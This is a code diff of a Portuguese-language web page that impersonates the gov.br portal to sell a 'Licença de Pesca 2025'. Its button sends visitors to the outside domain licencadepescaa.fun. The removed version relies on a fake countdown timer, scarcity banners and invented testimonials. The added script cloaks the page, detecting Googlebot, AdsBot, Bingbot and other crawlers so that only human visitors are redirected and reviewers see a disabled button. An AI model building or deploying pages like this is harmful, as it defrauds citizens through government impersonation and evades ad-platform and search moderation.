@@ -1,116 +1,143 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Licença de Pesca 2025</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 0;
-        background-color: #f4f4f4;
-        color: #333;
-      }
-      .top-bar {
-        background-color: #003366;
-        color: white;
-        text-align: center;
-        padding: 12px 0;
-        font-weight: bold;
-        font-size: 18px;
-        width: 100%;
-      }
-      .alerta {
-        background-color: red;
-        color: white;
-        text-align: center;
-        padding: 8px 0;
-        font-weight: bold;
-      }
-      .container {
-        max-width: 480px;
-        margin: auto;
-        padding: 20px;
-        background-color: white;
-        text-align: center;
-      }
-      .timer {
-        font-size: 24px;
-        font-weight: bold;
-        color: red;
-        margin: 15px 0;
-      }
-      .descricao {
-        font-size: 16px;
-        line-height: 1.5;
-        margin-bottom: 20px;
-      }
-      .botao {
-        background-color: #007bff;
-        color: white;
-        padding: 15px;
-        font-size: 18px;
-        border: none;
-        border-radius: 8px;
-        width: 100%;
-        cursor: pointer;
-        text-decoration: none;
-        display: inline-block;
-        margin-bottom: 20px;
-      }
-      .botao::before {
-        content: "\1F512 "; /* Cadeado emoji */
-      }
-      .selo {
-        display: block;
-        margin: 10px auto 20px;
-        max-width: 120px;
-      }
-      .depoimento {
-        background: #f1f1f1;
-        border-radius: 8px;
-        padding: 15px;
-        margin-bottom: 10px;
-        text-align: left;
-      }
-      .depoimento strong {
-        display: block;
-        margin-bottom: 5px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="top-bar">gov.br • Serviços ao Cidadão</div>
-    <div class="alerta">ÚLTIMAS VAGAS DISPONÍVEIS!</div>
-    <div class="container">
-      <div class="timer" id="timer">05:00</div>
-      <p class="descricao">
-        A Licença de Pesca 2025 já está disponível! Garanta agora mesmo seu direito de pescar legalmente em todo o território nacional. <br />
-        Processo rápido, seguro e 100% online.
-      </p>
-      <a class="botao" href="https://licencadepescaa.fun/inicio/">Solicitar Licença Agora</a>
-      <img src="https://raw.githubusercontent.com/matheusfelipeog/images/main/secure-badge.png" alt="Selo de segurança" class="selo" />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Solicitar Licença de Pescador</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
 
-      <div class="depoimento">
-        <strong>João Marcos - MG</strong>
-        "Achei que era difícil, mas em 2 minutos estava com a minha licença pronta. Muito obrigado!"
-      </div>
-      <div class="depoimento">
-        <strong>Carlos Henrique - PA</strong>
-        "Pesco todo ano, mas dessa vez fiz com antecedência e recebi tudo online. Rápido demais!"
-      </div>
+    header {
+      background-color: #002855;
+      color: #fff;
+      padding: 1rem;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 2rem;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .title {
+      font-size: 1.4rem;
+      font-weight: bold;
+      margin-bottom: 2rem;
+      text-align: center;
+      color: #002855;
+    }
+
+    .btn {
+      background-color: #004085;
+      color: white;
+      border: none;
+      padding: 1rem 3rem;
+      font-size: 1.2rem;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.3s ease;
+      margin: 1.5rem 0 2rem 0;
+      box-shadow: 0 4px 12px rgba(0, 64, 133, 0.3);
+    }
+
+    .btn:hover {
+      background-color: #002752;
+    }
+
+    .section {
+      margin-top: 1rem;
+      text-align: left;
+      width: 100%;
+    }
+
+    .section h2 {
+      font-size: 1.2rem;
+      color: #004085;
+      margin-bottom: 0.5rem;
+    }
+
+    .section p {
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #666;
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>gov.br • Serviços ao Cidadão</h1>
+  </header>
+
+  <div class="container">
+    <div class="title">Solicitar Licença de Pescador Amador ou Esportivo</div>
+
+    <button id="btnSolicitar" class="btn">Iniciar Solicitação</button>
+
+    <div class="section">
+      <h2>📌 O que é?</h2>
+      <p>
+        A pesca amadora ou esportiva é uma atividade de natureza não comercial. Isso significa que o pescado
+        obtido não pode ser vendido, mas pode ser utilizado para consumo próprio, ornamentação ou pesca esportiva (pesque e solte).
+      </p>
     </div>
 
-    <script>
-      let tempo = 4 * 60 + 59;
-      const el = document.getElementById("timer");
-      setInterval(() => {
-        const min = String(Math.floor(tempo / 60)).padStart(2, "0");
-        const sec = String(tempo % 60).padStart(2, "0");
-        el.textContent = `${min}:${sec}`;
-        if (tempo > 0) tempo--;
-      }, 1000);
-    </script>
-  </body>
+    <div class="section">
+      <h2>📋 Validade e requisitos</h2>
+      <p>
+        A licença tem validade de <strong>1 ano</strong> em todo o território nacional e deve ser emitida
+        diretamente pelo órgão responsável (SAP/MAPA).
+      </p>
+    </div>
+  </div>
+
+  <footer>
+    Esta é uma página informativa para facilitar o acesso ao processo de solicitação de licença.
+  </footer>
+
+  <script>
+    const bots = [
+      'Googlebot', 'AdsBot-Google', 'Mediapartners-Google',
+      'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+      'YandexBot', 'facebookexternalhit', 'Twitterbot'
+    ];
+
+    const isBot = bots.some(bot => navigator.userAgent.includes(bot));
+
+    if (!isBot) {
+      document.getElementById('btnSolicitar').addEventListener('click', () => {
+        window.location.href = "https://licencadepescaa.fun/inicio/";
+      });
+    } else {
+      const btn = document.getElementById('btnSolicitar');
+      btn.style.backgroundColor = '#888';
+      btn.style.cursor = 'not-allowed';
+      btn.innerText = 'Acesso restrito';
+    }
+  </script>
+</body>
 </html>
